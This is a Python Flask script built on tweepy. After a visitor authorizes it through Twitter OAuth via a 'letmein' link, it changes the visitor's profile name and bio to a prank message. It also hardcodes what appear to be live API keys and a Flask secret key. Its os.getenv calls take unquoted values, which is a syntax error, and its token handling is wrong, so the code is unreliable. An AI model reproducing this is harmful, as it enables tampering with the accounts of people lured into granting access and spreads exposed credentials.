import os
import tweepy
import requests
from flask import Flask, redirect, request, session, url_for
from dotenv import load_dotenv

load_dotenv()

# Twitter API credentials
API_KEY = os.getenv(LqfefyeCQ4qq3I4xLvVlH2HwQ)
API_SECRET = os.getenv(mVLQMUNlq9Q8blXv55H75MP61eIBJms28LtWzA1mYStVdDYuAV)
CALLBACK_URL = os.getenv(https://letmein-ydde.onrender.com)

app = Flask(__name__)
app.secret_key = "4IMdmq02AKFP7WqFdjeQ3iaqg3A7rHaiac7EybtTbT1gh"

# OAuth 1.0a authentication
auth = tweepy.OAuthHandler(API_KEY, API_SECRET, CALLBACK_URL)

@app.route("/")
def login():
    try:
        redirect_url = auth.get_authorization_url()
        session["request_token"] = auth.request_token
        return redirect(redirect_url)
    except tweepy.TweepyException as e:
        return f"Error! Failed to get request token. {str(e)}"

@app.route("/callback")
def callback():
    request_token = session.pop("request_token", None)
    auth.request_token = {"oauth_token": request.args["oauth_token"], "oauth_token_secret": request_token}

    try:
        auth.get_access_token(request.args["oauth_verifier"])
        api = tweepy.API(auth)

        # Change username and bio
        new_username = "Miss Hannah's Fan"
        new_bio = "I clicked the link and now my profile is changed!"
        api.update_profile(name=new_username, description=new_bio)

        return f"Success! Your profile has been updated to: {new_username} - {new_bio}"
    except tweepy.TweepyException as e:
        return f"Error updating profile: {str(e)}"

if __name__ == "__main__":
    app.run(debug=True)